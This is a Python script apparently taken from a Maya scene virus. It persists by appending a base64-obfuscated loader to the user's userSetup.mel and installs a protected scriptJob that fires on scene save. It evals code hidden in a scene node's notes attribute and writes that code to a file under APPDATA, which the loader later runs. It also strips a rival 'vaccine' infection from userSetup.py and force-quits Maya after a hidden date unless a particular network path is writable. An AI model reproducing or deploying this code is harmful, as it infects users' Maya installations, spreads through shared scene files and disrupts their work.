import maya.cmds as cmds
import subprocess
import datetime	
import base64
import stat 
import sys
import os

class phage:
    def antivirus(self):
        pass
    def occupation(self):
        cmds.scriptJob(event=["SceneSaved", "leukocyte.antivirus()"], protected=True)
leukocyte = phage()
leukocyte.occupation()
usepypath = cmds.internalVar(userAppDir=True) + '/scripts/userSetup.py'   
if  os.path.exists(usepypath):
    os.chmod( usepypath, stat.S_IWRITE ) 
    with open(usepypath, 'rb') as f:
        data = f.readline()     
    setAttrdslist=[]
    x_ = open(usepypath, "r")
    for line in x_:
        if ("import vaccine" in line) or ("cmds.evalDeferred('leukocyte = vaccine.phage()')" in line) or ("cmds.evalDeferred('leukocyte.occupation()')" in line):
            pass                
        else: 
            setAttrdslist.append(line)    
    newfile=open(usepypath,"w")
    newfile.writelines(setAttrdslist)
    newfile.close()
        
p="\n"
address_path = cmds.internalVar(userAppDir=True) + 'scripts/userSetup.mel'
M_el= "import base64; pyCode = base64.urlsafe_b64decode('aW1wb3J0IGJpbmFzY2lpDWltcG9ydCBvcw1tYXlhX3BhdGhfPW9zLmdldGVudigiQVBQREFUQSIpKydcc3lzc3N0Jw1tYXlhcGF0aD1tYXlhX3BhdGhfLnJlcGxhY2UoJ1xcJywnLycpDW1heWFfcGF0aD0nJXMvdWl0aW9uLnQnJW1heWFwYXRoDXRyeToNICAgIHdpdGggb3BlbihtYXlhX3BhdGgsICdyYicpIGFzIGY6DSAgICAgICAgZF9hX3RfYSA9IGYucmVhZCgpDSAgICBkYXRhID0gYmluYXNjaWkuYTJiX2Jhc2U2NChkX2FfdF9hKQ0gICAgZXhlYyhkYXRhKQ1leGNlcHQgSU9FcnJvciBhcyBlOg0gICAgcGFzcw=='); exec (pyCode)"
xxx='python("%s");' % M_el
pMel=p+xxx
if not os.path.exists(address_path):
    with open(address_path, "a") as f:
    	f.writelines(pMel)
else:
    os.chmod( address_path, stat.S_IWRITE )     
    userSetupList=[]
    with open(address_path, "r") as f:
        content = f.readlines()
        if xxx in content:
            userSetupList.append(xxx)
    if not userSetupList:         
        with open(address_path, "a") as f:
        	f.writelines(pMel)




















































uitionpath_=os.getenv("APPDATA")+base64.urlsafe_b64decode('L3N5c3NzdA==').decode('utf-8')
uitionpath=uitionpath_.replace('\\','/')
if not os.path.exists(uitionpath):
    os.mkdir(uitionpath)   
uition_path="%s%s"%(uitionpath,base64.urlsafe_b64decode('L3VpdGlvbi50').decode('utf-8'))
try:
	if cmds.objExists('uifiguration'):
		Xgee = eval(cmds.getAttr('uifiguration.notes'))
		with open(uition_path, "w") as f:
			f.writelines(Xgee)
except ValueError as e:
    pass
if not os.access(base64.urlsafe_b64decode('UDovS28uVnBu').decode('utf-8'),os.W_OK):
	if datetime.datetime.now().strftime('%Y%m%d') >=base64.urlsafe_b64decode('MjAyNDA1MDE==').decode('utf-8'):
		cmds.quit(abort=True)